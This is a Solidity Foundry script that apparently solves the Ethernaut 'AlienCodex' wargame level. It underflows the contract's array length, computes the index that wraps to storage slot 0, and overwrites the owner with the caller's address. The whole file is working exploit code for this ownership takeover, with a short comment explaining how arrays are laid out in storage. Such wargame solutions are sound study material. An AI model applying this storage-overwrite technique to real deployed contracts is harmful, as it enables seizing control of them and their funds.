// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { AlienCodex } from "../src/AlienCodex.sol";

contract AlienCodexSolver is Script {
	
	AlienCodex public instance = AlienCodex(0x333C6919146707e095EA30e07aab105bBC30A1b9);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);

        instance.makeContact();
        instance.record(bytes32(uint256(1337)));
        console.log(address(uint160(uint256(instance.codex(0)))));
        console.log(instance.owner());

        instance.retract();
        instance.retract();

        for (uint256 slot = 0; slot < 10; slot++) {
            console.logBytes32(vm.load(address(instance), bytes32(slot)));
        }
        console.log("======");

        uint256 i = type(uint256).max - uint256(keccak256(abi.encode(1))) + 1;
        instance.revise(i, bytes32(uint256(uint160(me))));

        for (uint256 slot = 0; slot < 10; slot++) {
            console.logBytes32(vm.load(address(instance), bytes32(slot)));
        }
        console.log("======");

        console.log("did we just take over the contract ?", me == instance.owner());

        // because solidity doesnt support memory allocaltion, it uses this technic to dynamically store elements in arrays:
        // the ith element of an array in slot S is stored in the storage location of Slot = Keccak256(S) + i
        // where keccak is a hash function

		vm.stopBroadcast();


	}

}
